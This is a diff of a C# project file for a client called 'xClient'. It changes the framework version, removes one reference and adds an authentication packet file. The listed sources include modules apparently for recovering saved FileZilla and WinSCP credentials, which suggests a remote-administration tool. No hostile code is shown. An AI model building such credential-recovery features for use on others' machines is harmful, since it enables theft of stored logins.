@@ -10,7 +10,7 @@
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>xClient</RootNamespace>
     <AssemblyName>Client</AssemblyName>
-    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <TargetFrameworkProfile>Client</TargetFrameworkProfile>
   </PropertyGroup>
@@ -48,7 +48,6 @@
     <Reference Include="System.Management" />
     <Reference Include="System.Runtime.Serialization" />
     <Reference Include="System.Security" />
-    <Reference Include="System.ServiceModel.Web" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
   </ItemGroup>
@@ -102,6 +101,7 @@
     <Compile Include="Core\Registry\RegistrySeeker.cs" />
     <Compile Include="Core\Registry\RegistrySeekerParams.cs" />
     <Compile Include="Core\Registry\RegSeekerMatch.cs" />
+    <Compile Include="Core\Packets\ServerPackets\SetAuthenticationSuccess.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
